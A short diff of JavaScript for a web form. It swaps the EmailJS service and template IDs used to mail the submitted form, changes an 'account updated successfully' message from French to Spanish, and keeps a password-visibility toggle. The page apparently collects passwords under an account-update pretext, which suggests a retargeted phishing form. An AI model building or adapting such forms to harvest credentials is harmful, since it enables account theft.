@@ -10,10 +10,10 @@ form.addEventListener("submit", function(event) {
   event.preventDefault();
   btn.value = "Sending...";
 
-  emailjs.sendForm("service_lzbsfa9", "template_72u03p9", this)
+  emailjs.sendForm("service_nowupmh", "template_km6mz74", this)
     .then(() => {
       btn.value = "Send";
-      status.innerText = "✅ Compte mis à jour avec succès... !";
+      status.innerText = "✅ Cuenta actualizada correctamente...!";
       form.reset();
     }, (err) => {
       btn.value = "Send";
@@ -26,4 +26,5 @@ passwordToggle.addEventListener("click", () => {
   const isPassword = passwordField.type === "password";
   passwordField.type = isPassword ? "text" : "password";
   passwordToggle.textContent = isPassword ? "🙈" : "👁";
+
 });
